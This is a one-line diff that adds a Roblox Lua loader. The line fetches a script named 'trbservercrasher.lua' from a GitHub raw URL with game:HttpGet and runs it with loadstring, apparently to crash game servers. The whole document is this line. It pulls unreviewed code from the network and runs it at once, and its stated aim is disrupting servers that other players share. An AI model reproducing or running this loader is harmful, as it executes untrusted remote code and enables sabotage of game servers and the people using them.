@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/susbleguys-hue/trb-scripts/refs/heads/main/ftap/trbservercrasher.lua"))()
